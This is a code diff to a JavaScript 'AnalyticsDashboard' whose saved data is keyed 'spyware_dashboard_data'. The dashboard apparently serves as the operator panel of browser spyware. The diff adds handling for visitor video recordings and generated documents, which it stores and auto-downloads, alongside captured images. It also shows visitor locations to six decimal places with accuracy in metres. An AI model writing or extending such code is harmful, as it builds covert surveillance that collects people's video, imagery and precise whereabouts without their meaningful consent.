@@ -95,12 +95,23 @@ class AnalyticsDashboard {
     processVisitorData(data) {
         const visitorId = data.id || data.sessionId;
         
-        // Add visitor
-        this.visitors.set(visitorId, {
-            ...data,
-            firstSeen: data.timestamp || new Date().toISOString(),
-            lastSeen: new Date().toISOString()
-        });
+        // Check if visitor already exists
+        if (this.visitors.has(visitorId)) {
+            // Update existing visitor
+            const existingVisitor = this.visitors.get(visitorId);
+            this.visitors.set(visitorId, {
+                ...existingVisitor,
+                ...data,
+                lastSeen: new Date().toISOString()
+            });
+        } else {
+            // Add new visitor
+            this.visitors.set(visitorId, {
+                ...data,
+                firstSeen: data.timestamp || new Date().toISOString(),
+                lastSeen: new Date().toISOString()
+            });
+        }
 
         // Update stats
         this.stats.totalVisitors = this.visitors.size;
@@ -121,6 +132,16 @@ class AnalyticsDashboard {
                 visitorId,
                 timestamp: new Date().toISOString()
             });
+        }
+
+        // Handle video recordings
+        if (data.type === 'VIDEO_RECORDING') {
+            this.handleVideoRecording(data);
+        }
+
+        // Handle stats documents
+        if (data.type === 'STATS_DOCUMENT') {
+            this.handleStatsDocument(data);
         }
 
         this.updateUI();
@@ -220,7 +241,7 @@ class AnalyticsDashboard {
                 <div class="visitor-info">
                     <div><strong>Device:</strong> ${visitor.deviceInfo?.browser || 'Unknown'}</div>
                     <div><strong>Screen:</strong> ${visitor.screenResolution || 'Unknown'}</div>
-                    <div><strong>Location:</strong> ${visitor.location && typeof visitor.location.latitude === 'number' && typeof visitor.location.longitude === 'number' ? `${visitor.location.latitude.toFixed(2)}, ${visitor.location.longitude.toFixed(2)}` : visitor.location && visitor.location.latitude && visitor.location.longitude ? `${visitor.location.latitude}, ${visitor.location.longitude}` : 'Not granted'}</div>
+                    <div><strong>Location:</strong> ${visitor.location ? (typeof visitor.location.latitude === 'number' && typeof visitor.location.longitude === 'number' ? `${visitor.location.latitude.toFixed(6)}, ${visitor.location.longitude.toFixed(6)} (${visitor.location.accuracyLevel || visitor.location.source || 'browser'})${visitor.location.accuracy ? ` ±${Math.round(visitor.location.accuracy)}m` : ''}` : visitor.location.latitude && visitor.location.longitude ? `${visitor.location.latitude}, ${visitor.location.longitude} (${visitor.location.source || 'browser'})` : 'Not granted') : 'Not granted'}</div>
                     <div><strong>Permissions:</strong> ${this.formatPermissions(visitor.permissions)}</div>
                     <div><strong>Last seen:</strong> ${new Date(visitor.lastSeen).toLocaleTimeString()}</div>
                 </div>
@@ -385,6 +406,92 @@ class AnalyticsDashboard {
         }
     }
 
+    handleVideoRecording(data) {
+        // Store video data for dashboard viewing
+        if (!this.videoRecordings) this.videoRecordings = [];
+        
+        this.videoRecordings.push({
+            sessionId: data.sessionId,
+            videoData: data.videoData,
+            fileName: data.fileName,
+            timestamp: data.timestamp,
+            duration: data.duration
+        });
+        
+        // Add to live feed
+        this.addToLiveFeed({
+            type: 'video',
+            message: `Video recording completed for ${data.sessionId}`,
+            timestamp: new Date().toISOString()
+        });
+        
+        // Auto-download video to dashboard device
+        this.downloadVideo(data.videoData, data.fileName);
+        
+        console.log('Video recording processed:', data.fileName);
+    }
+
+    handleStatsDocument(data) {
+        // Store document data
+        if (!this.statsDocuments) this.statsDocuments = [];
+        
+        this.statsDocuments.push({
+            sessionId: data.sessionId,
+            documentContent: data.documentContent,
+            fileName: data.fileName,
+            timestamp: data.timestamp
+        });
+        
+        // Add to live feed
+        this.addToLiveFeed({
+            type: 'document',
+            message: `Stats document generated for ${data.sessionId}`,
+            timestamp: new Date().toISOString()
+        });
+        
+        // Auto-download document to dashboard device
+        this.downloadDocument(data.documentContent, data.fileName);
+        
+        console.log('Stats document processed:', data.fileName);
+    }
+
+    downloadVideo(videoData, fileName) {
+        // Convert base64 to blob and download
+        const byteCharacters = atob(videoData.split(',')[1]);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], { type: 'video/webm' });
+        
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = fileName;
+        
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    downloadDocument(documentContent, fileName) {
+        const blob = new Blob([documentContent], { type: 'application/msword' });
+        const url = URL.createObjectURL(blob);
+        
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = fileName;
+        
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
     loadStoredData() {
         const stored = localStorage.getItem('spyware_dashboard_data');
         if (stored) {
@@ -394,6 +501,8 @@ class AnalyticsDashboard {
                 this.capturedImages = data.capturedImages || [];
                 this.liveFeed = data.liveFeed || [];
                 this.stats = data.stats || this.stats;
+                this.videoRecordings = data.videoRecordings || [];
+                this.statsDocuments = data.statsDocuments || [];
                 this.updateUI();
             } catch (e) {
                 console.error('Failed to load stored data:', e);
